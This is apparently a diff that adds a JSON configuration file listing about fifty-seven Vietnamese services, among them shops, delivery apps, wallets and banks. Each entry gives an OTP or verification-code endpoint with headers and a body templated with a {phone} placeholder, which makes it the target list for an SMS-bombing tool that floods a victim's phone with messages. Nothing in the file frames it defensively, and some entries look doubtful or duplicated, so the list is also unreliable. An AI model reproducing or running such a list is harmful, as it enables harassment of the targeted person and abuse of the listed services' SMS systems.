@@ -1,0 +1,615 @@
+[
+    {
+        "name": "30Shine",
+        "url": "https://f9q6qhckw1.execute-api.ap-southeast-1.amazonaws.com/Product/api/v1/auth/verify",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://30shine.com",
+            "referer": "https://30shine.com/"
+        },
+        "json": {
+            "phone": "+84{phone_raw}",
+            "brandName": "30SHINE"
+        }
+    },
+    {
+        "name": "Viettel Money",
+        "url": "https://viettelmoney.vn/api/v1/auth/send-otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "HeyU",
+        "url": "https://api.heyu.asia/api/v2.1/member/send-code",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json;charset=utf-8"
+        },
+        "json": {
+            "phone": "{phone}",
+            "deviceId": "33FC417B-681E-4C47-A0B8-DC98ED2F0BA8",
+            "platform": "ios"
+        }
+    },
+    {
+        "name": "Tiki",
+        "url": "https://tiki.vn/api/v2/tokens",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://tiki.vn",
+            "referer": "https://tiki.vn/"
+        },
+        "json": {
+            "grant_type": "password",
+            "username": "{phone}"
+        }
+    },
+    {
+        "name": "Dien May Xanh",
+        "url": "https://www.dienmayxanh.com/lich-su-mua-hang/GetVerifyCode",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/x-www-form-urlencoded"
+        },
+        "data": "phoneNumber={phone}&isReSend=false&sendOTPType=1"
+    },
+    {
+        "name": "The Gioi Di Dong",
+        "url": "https://www.thegioididong.com/lich-su-mua-hang/GetVerifyCode",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/x-www-form-urlencoded"
+        },
+        "data": "phoneNumber={phone}&isReSend=false&sendOTPType=1"
+    },
+    {
+        "name": "Shopee",
+        "url": "https://shopee.vn/api/v2/authentication/get_otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "referer": "https://shopee.vn"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "GalaxyPlay",
+        "url": "https://api.glxplay.io/account/phone/verify?phone={phone}",
+        "method": "POST",
+        "headers": {
+            "origin": "https://galaxyplay.vn",
+            "referer": "https://galaxyplay.vn/"
+        }
+    },
+    {
+        "name": "Grab",
+        "url": "https://api.grab.com/grabid/v1/phone/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/x-www-form-urlencoded"
+        },
+        "data": "method=SMS&countryCode=VN&phoneNumber={phone_raw}"
+    },
+    {
+        "name": "FPT Shop",
+        "url": "https://papi.fptshop.com.vn/gw/v1/public/bff-before-order/customer-kyc/customer-policy?phoneNumber={phone}",
+        "method": "GET",
+        "headers": {
+            "origin": "https://fptshop.com.vn",
+            "referer": "https://fptshop.com.vn/"
+        }
+    },
+    {
+        "name": "TV360",
+        "url": "https://tv360.vn/public/v1/auth/get-otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://tv360.vn"
+        },
+        "json": {
+            "msisdn": "{phone}"
+        }
+    },
+    {
+        "name": "Mocha",
+        "url": "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn={phone}&languageCode=vi",
+        "method": "POST",
+        "headers": {
+            "origin": "https://video.mocha.com.vn",
+            "referer": "https://video.mocha.com.vn/"
+        }
+    },
+    {
+        "name": "Lazada",
+        "url": "https://member.lazada.vn/user/api/sendCode",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/x-www-form-urlencoded"
+        },
+        "data": "mobile={phone}&countryCode=VN"
+    },
+    {
+        "name": "Tiktok",
+        "url": "https://www.tiktok.com/api/user/send_verify_code",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/x-www-form-urlencoded"
+        },
+        "data": "mobile={phone_raw}&region_code=84&type=1"
+    },
+    {
+        "name": "Nha Thuoc Long Chau",
+        "url": "https://api.nhathuoclongchau.com.vn/lccus/customers/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phoneNumber": "{phone}"
+        }
+    },
+    {
+        "name": "CellphoneS",
+        "url": "https://api.cellphones.com.vn/v2/auth/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Hasaki",
+        "url": "https://hasaki.vn/rest/otp/sendOtp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://hasaki.vn"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Sapo",
+        "url": "https://accounts.sapo.vn/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "email_or_phone": "{phone}"
+        }
+    },
+    {
+        "name": "FPT Telecom",
+        "url": "https://fpt.vn/api/v1/auth/send-otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Lotteria",
+        "url": "https://api.lotteria.vn/v1/auth/send-otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Sendo",
+        "url": "https://www.sendo.vn/api/auth/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://www.sendo.vn"
+        },
+        "json": {
+            "phone": "{phone}",
+            "type": "register"
+        }
+    },
+    {
+        "name": "Nguyen Kim",
+        "url": "https://www.nguyenkim.com/api/v1/auth/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://www.nguyenkim.com"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "VNDirect",
+        "url": "https://auth-api.vndirect.com.vn/v3/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}",
+            "channel": "sms"
+        }
+    },
+    {
+        "name": "Foody",
+        "url": "https://gappapi.deliverynow.vn/api/user/request_login",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "x-foody-client-type": "1",
+            "x-foody-api-version": "1",
+            "x-foody-client-language": "vi",
+            "x-foody-app-type": "1004"
+        },
+        "json": {
+            "Phone": "{phone}"
+        }
+    },
+    {
+        "name": "Shopee Food",
+        "url": "https://gappapi.deliverynow.vn/api/user/request_login",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "x-foody-client-type": "4",
+            "x-foody-api-version": "1",
+            "x-foody-client-language": "vi"
+        },
+        "json": {
+            "Phone": "{phone}",
+            "Type": 1
+        }
+    },
+    {
+        "name": "ZaloPay",
+        "url": "https://social-api.zalopay.vn/v1/user/sendotp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone_raw}",
+            "countryCode": "84"
+        }
+    },
+    {
+        "name": "MoMo 2",
+        "url": "https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "app_version": "4.1.37"
+        },
+        "json": {
+            "phone": "{phone}",
+            "msgType": "SEND_OTP_MSG"
+        }
+    },
+    {
+        "name": "VNPT Pay",
+        "url": "https://api.vnptpay.vn/api/v1/auth/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Bat Dong San",
+        "url": "https://bds.com.vn/api/v1/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://batdongsan.com.vn"
+        },
+        "json": {
+            "phone": "{phone}",
+            "type": "register"
+        }
+    },
+    {
+        "name": "MyViettel",
+        "url": "https://apigw.viettel.vn/myvt/customer/send-otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "BIDV SmartBanking",
+        "url": "https://smartbanking.bidv.com.vn/api/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "VPBank",
+        "url": "https://online.vpbank.com.vn/api/v1/auth/send-otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "TPBank",
+        "url": "https://ebank.tpb.vn/gateway/api/auth/sendotp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}",
+            "type": "LOGIN"
+        }
+    },
+    {
+        "name": "OCB OMNI",
+        "url": "https://api.ocb.com.vn/auth/v1/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "ZingMP3",
+        "url": "https://id.zing.vn/v2/mobile/login/sendotp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone_raw}",
+            "countryCode": 84
+        }
+    },
+    {
+        "name": "Zalo",
+        "url": "https://sr-otp.zadn.vn/v2/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "+84{phone_raw}"
+        }
+    },
+    {
+        "name": "Baemin",
+        "url": "https://api.bfrn.kr/v6/app/member/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "x-country-code": "vn"
+        },
+        "json": {
+            "phoneNumber": "+84{phone_raw}"
+        }
+    },
+    {
+        "name": "Giao Hang Nhanh",
+        "url": "https://sso.ghn.vn/api/v1/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Giao Hang Tiet Kiem",
+        "url": "https://khachhang.giaohangtietkiem.vn/api/auth/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "PNJ",
+        "url": "https://api.pnj.com.vn/api/auth/v1/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://www.pnj.com.vn"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "SenVang",
+        "url": "https://api.senvangvn.com/api/v1/login/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Pharmacity",
+        "url": "https://api.pharmacity.vn/api/v2/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Guardian",
+        "url": "https://api.guardian.com.vn/api/v1/auth/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Watsons",
+        "url": "https://api.watsons.vn/api/v1/auth/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Bitis",
+        "url": "https://www.bfrn.kr/api/auth/send-otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://www.bfrn.kr"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Concung",
+        "url": "https://apiv3.concung.com/api/v1/auth/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Bach Hoa Xanh",
+        "url": "https://www.bachhoaxanh.com/api/web/Account/SendOTP",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json",
+            "origin": "https://www.bachhoaxanh.com"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Marathon",
+        "url": "https://api.marathon.vn/api/v1/auth/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "GHN Express",
+        "url": "https://fe.ghn.vn/api/app/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "AhaMove",
+        "url": "https://apigw.ahamove.com/v1/user/send_otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "+84{phone_raw}"
+        }
+    },
+    {
+        "name": "Be 2",
+        "url": "https://api.be.com.vn/api/v1/auth/otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Vexere",
+        "url": "https://api.vexere.com/api/v2/auth/send-otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Momo 3",
+        "url": "https://api.momo.vn/auth/send-otp",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}"
+        }
+    },
+    {
+        "name": "Tiki 2",
+        "url": "https://api.tiki.vn/customer/v2/otp/send",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json"
+        },
+        "json": {
+            "phone": "{phone}",
+            "channel": "sms"
+        }
+    }
+]
